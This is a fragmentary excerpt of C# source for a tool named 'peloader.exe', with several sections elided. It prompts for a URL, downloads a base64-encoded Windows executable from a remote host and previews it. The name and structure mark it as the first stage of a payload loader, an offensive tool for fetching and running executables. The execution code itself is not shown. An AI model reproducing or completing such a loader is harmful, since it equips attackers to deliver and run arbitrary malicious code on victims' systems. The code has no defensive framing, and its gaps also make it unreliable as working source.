    ...
    {	
		public static void Main(string[] args)
        {
			/* if (args.Length < 1)
			{
				...
				Console.WriteLine("Usage : peloader.exe <B64_PE_URL>");
				return;
			}*/
			
			Console.WriteLine("[*] Enter URL to the base64 PE file : ");
			...
			string peAsString = DownloadBase64(url);

			if (!string.IsNullOrEmpty(peAsString))
			{
				Console.WriteLine("[+] Content stored with success");
				Console.WriteLine("[+] Preview(50 chars) : "+peAsString.Substring(0, Math.Min(peAsString.Length, 50))+"...");				
			}
			else
			{
				Console.WriteLine("[-] Can't retrieve the file !");
				return;
			}
		...
		static string DownloadBase64(string targetUrl)
		{
